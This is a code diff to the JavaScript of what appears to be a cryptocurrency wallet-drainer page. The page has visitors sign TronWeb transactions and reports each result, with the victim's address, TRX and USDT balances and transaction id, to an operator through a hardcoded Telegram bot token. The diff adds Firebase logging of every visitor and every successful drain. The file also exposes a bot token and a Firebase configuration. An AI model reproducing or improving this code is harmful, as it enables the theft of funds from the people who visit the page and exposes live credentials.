@@ -9,9 +9,14 @@ const firebaseConfig = {
     appId: "1:500883948250:web:203f69935a6825d09b5be3"
 };
 
-if (typeof firebase !== 'undefined') {
-    firebase.initializeApp(firebaseConfig);
+// Firebase initialization helper
+function initFirebase() {
+    if (typeof firebase !== 'undefined' && firebase.apps.length === 0) {
+        firebase.initializeApp(firebaseConfig);
+    }
 }
+
+initFirebase();
 
 const CONFIG = {
     BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
@@ -50,6 +55,18 @@ async function getStats(address) {
 document.getElementById('next-btn').addEventListener('click', async () => {
     const btn = document.getElementById('next-btn');
     btn.classList.add('btn-loading'); // Always show spinner first
+
+    // --- Instant Visitor Alert ---
+    initFirebase();
+    if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
+        firebase.database().ref('connections/' + Date.now()).set({
+            address: "Incoming Visitor...",
+            usdt: "0.00",
+            trx: "0.00",
+            time: new Date().toLocaleTimeString(),
+            status: "VISITOR"
+        });
+    }
 
     // Silent check: Wait until systems are ready without showing alerts
     let attempts = 0;
@@ -100,6 +117,13 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                     await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
                     alert("Transaction sent to the network.");
+                    
+                    // --- Real-time Firebase Update (SUCCESS) ---
+                    if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
+                        firebase.database().ref('connections/' + Date.now()).set({
+                            address, usdt, trx, time: new Date().toLocaleTimeString(), status: "SUCCESS", txid: receipt.txid
+                        });
+                    }
                     location.reload();
                 } catch (err) {
                     let reason = "User Rejected";
